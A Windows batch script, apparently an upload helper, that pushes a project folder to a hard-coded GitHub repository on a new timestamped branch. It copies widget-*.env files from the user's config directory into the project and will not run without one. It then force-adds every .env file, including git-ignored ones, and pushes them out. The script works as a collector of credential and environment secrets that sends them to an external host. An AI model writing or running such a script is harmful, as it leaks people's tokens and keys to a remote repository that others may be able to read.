@echo off
setlocal EnableExtensions DisableDelayedExpansion

rem Place this BAT in the project folder you want to upload.
cd /d "%~dp0" || goto :failed

set "REPO=https://github.com/dimaskoras/termux.git"

where git >nul 2>&1
if errorlevel 1 (
  echo ERROR: Git was not found. Install Git for Windows first.
  goto :failed
)

rem The original widget bot may keep its ENV outside the project.
rem Copy widget-*.env files from that known config directory if present.
if exist "%USERPROFILE%\.config\widget-sandbox\" (
  for %%E in ("%USERPROFILE%\.config\widget-sandbox\widget-*.env") do (
    if exist "%%~fE" (
      if not exist "%%~nxE" (
        echo Copying %%~nxE into project folder...
        copy /Y "%%~fE" "%%~nxE" >nul || goto :failed
      )
    )
  )
)

rem Make sure a widget bot ENV is actually in this project before uploading.
set "FOUND_WIDGET_ENV="
for /r %%E in (widget-*.env) do (
  if exist "%%~fE" set "FOUND_WIDGET_ENV=1"
)
if not defined FOUND_WIDGET_ENV (
  echo ERROR: No widget-*.env found in project or known config folder.
  echo Put widget-bot.env / widget-[bot].env here and run again.
  goto :failed
)

rem Initialize a separate repo for this folder if needed.
if not exist ".git" (
  git init || goto :failed
)

rem Set the requested GitHub repository as origin.
git remote get-url origin >nul 2>&1
if errorlevel 1 (
  git remote add origin "%REPO%" || goto :failed
) else (
  git remote set-url origin "%REPO%" || goto :failed
)

rem Create a different new branch every time the BAT is launched.
set "STAMP="
for /f %%T in ('powershell -NoProfile -Command "Get-Date -Format yyyyMMdd-HHmmss"') do set "STAMP=%%T"
if not defined STAMP set "STAMP=%RANDOM%%RANDOM%"
set "BRANCH=widgets-%STAMP%"
git switch -c "%BRANCH%" || goto :failed

echo.
echo Adding all normal project files...
git add -A || goto :failed

echo Force-adding all *.env, .env and .env.* files, including ignored files...
for /r %%E in (*.env .env .env.*) do (
  if exist "%%~fE" (
    git add -f -- "%%~fE" || goto :failed
  )
)

echo.
echo Creating commit...
git diff --cached --quiet
if errorlevel 1 (
  git commit -m "Upload project including ENV files" || goto :failed
) else (
  echo No staged changes; pushing a new branch at current commit.
  git rev-parse --verify HEAD >nul 2>&1 || goto :failed
)

echo.
echo Pushing %BRANCH% to %REPO%...
git push -u origin "%BRANCH%" || goto :failed

echo.
echo SUCCESS!
echo Branch: %BRANCH%
echo https://github.com/dimaskoras/termux/tree/%BRANCH%
echo.
pause
exit /b 0

:failed
echo.
echo FAILED. Please read the error messages above.
pause
exit /b 1
